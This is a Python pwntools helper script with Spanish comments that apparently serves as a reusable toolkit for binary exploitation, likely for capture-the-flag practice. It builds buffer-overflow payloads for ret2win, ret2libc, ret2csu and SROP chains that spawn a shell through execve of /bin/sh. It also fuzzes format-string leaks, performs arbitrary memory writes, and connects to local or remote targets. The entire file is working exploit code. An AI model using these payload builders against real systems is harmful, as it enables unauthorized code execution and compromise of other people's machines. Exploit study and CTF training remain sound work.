#!/usr/bin/env python3
from pwn import *

def pack_val(val, bits=64):
    """Empaqueta enteros a bytes (Little Endian) automáticamente si no lo son."""
    if isinstance(val, int):
        return p64(val) if bits == 64 else p32(val)
    if isinstance(val, str):
        return val.encode()
    return val

def init_conn(binary_path=None, ip=None, port=None, gdbscript=""):
    """Maneja entornos dinámicos: Local, GDB o REMOTE (vía terminal args)."""
    if binary_path: context.binary = elf = ELF(binary_path, checksec=False)
    if args.REMOTE:
        return remote(ip, port)
    else:
        p = process(elf.path)
        if args.GDB and gdbscript: gdb.attach(p, gdbscript=gdbscript)
        return p

def calc_libc_base(leaked_addr, symbol_name, libc_path):
    """Ajusta la base de la Libc basándose en un leak."""
    libc = ELF(libc_path, checksec=False)
    return leaked_addr - libc.symbols[symbol_name]

def bof_ret2win(offset, target_addr, bits=64, payload_extra=b""):
    """Payload clásico para redirigir EIP/RIP."""
    return b"A" * offset + pack_val(target_addr, bits) + payload_extra

def bof_ret2libc(offset, pop_rdi, bin_sh, system, ret_align=None, bits=64):
    """Ret2Libc estructurado con bypass opcional para la alineación MOVAPS de Ubuntu x64."""
    payload = b"A" * offset + pack_val(pop_rdi, bits) + pack_val(bin_sh, bits)
    if ret_align: payload += pack_val(ret_align, bits)
    return payload + pack_val(system, bits)

def bof_ret2csu(offset, csu_gadget_pops, csu_gadget_movs, rbx, rbp, r12_func_ptr, r13_rdi, r14_rsi, r15_rdx):
    """Ataque __libc_csu_init cuando no tienes gadgets nativos en el binario principal."""
    payload = b"A" * offset
    payload += pack_val(csu_gadget_pops)  # pop rbx, rbp, r12, r13, r14, r15; ret
    payload += pack_val(rbx)              # 0
    payload += pack_val(rbp)              # 1
    payload += pack_val(r12_func_ptr)     # Dirección GOT de la función a llamar
    payload += pack_val(r13_rdi)          # Valor para RDI
    payload += pack_val(r14_rsi)          # Valor para RSI
    payload += pack_val(r15_rdx)          # Valor para RDX
    payload += pack_val(csu_gadget_movs)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call...
    return payload

def bof_srop(offset, syscall_addr, bin_sh_addr):
    """SROP (Sigreturn Frame) automatizado para invocar execve en arquitecturas x64."""
    context.arch = "amd64"
    frame = SigreturnFrame()
    frame.rax = 59  # execve
    frame.rdi = bin_sh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_addr
    return b"A" * offset + bytes(frame)

def fmt_leak_stack(p, start_idx, end_idx):
    """Fuzzea posiciones de memoria mediante vulnerabilidades de Format String."""
    for i in range(start_idx, end_idx + 1):
        p.sendline(f"%{i}$p".encode())
        try:
            print(f"Index {i} -> {p.recvall(timeout=0.2).decode().strip()}")
        except Exception: continue

def fmt_write_mem(offset, target_addr, value_to_write):
    """Escritura arbitraria automatizada en formato string."""
    return fmtstr_payload(offset, {target_addr: value_to_write})
